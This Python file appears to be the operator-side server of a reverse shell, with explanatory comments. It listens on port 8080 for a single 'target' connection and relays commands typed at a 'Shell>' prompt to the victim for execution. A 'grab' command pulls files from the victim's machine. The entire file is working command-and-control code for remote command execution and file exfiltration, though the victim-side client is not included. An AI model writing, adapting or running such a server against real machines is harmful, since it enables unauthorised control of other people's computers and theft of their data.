# TCP Server
from socket import socket, AF_INET, SOCK_STREAM

class Server:
    ''' Shell Server '''
    def __init__(self):
        self.IP = '<SERVER-IP-ADDRESS>'
        self.PORT = 8080

    def transfer(self, conn, command):
        ''' receive transfer file '''
        conn.send(command.encode())
        filename = command.split()[-1]
        f = open(filename, 'wb')
        while True: 
            bits = conn.recv(1024)
            if b'Unable to find out the file' in bits:
                print('[!] Unable to find out the file')
                break
            if bits == b'DONE':
                print('[*] Transfer completed ')
                f.close()
                break
            f.write(bits)

    def connect(self):
        ''' listen for client connection '''
        s = socket(AF_INET, SOCK_STREAM) 
        # define the server IP and the listening port
        s.bind((self.IP, self.PORT)) 
        # define the backlog size, since we are expecting a single connection from a single
        # target we will listen to one connection
        s.listen(1) 
        print(f'[*] Listening for incoming TCP connection on port {self.PORT}')
        # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
        # port in a tuple format (IP,port)
        conn, addr = s.accept() 
        print('[+] Connection Received: ', addr)

        while True:
            # Get user input and store it in command variable
            command = input("Shell> ") 
            
            if 'terminate' in command: 
                # If we got terminate command, inform the client and close the connect and break the loop
                conn.send(b'terminate')
                conn.close()
                break
            elif 'grab' in command:    
                # if we received grab keyword from the user input, then this is an indicator for
                # file transfer operation, hence we will call transfer function
                self.transfer(conn, command)
            else:
                # Otherwise we will send the command to the target
                conn.send(command.encode()) 
                # and print the result that we got back
                print(conn.recv(1024).decode()) 

def main():
    s = Server()
    s.connect()

if __name__ == "__main__":
    main()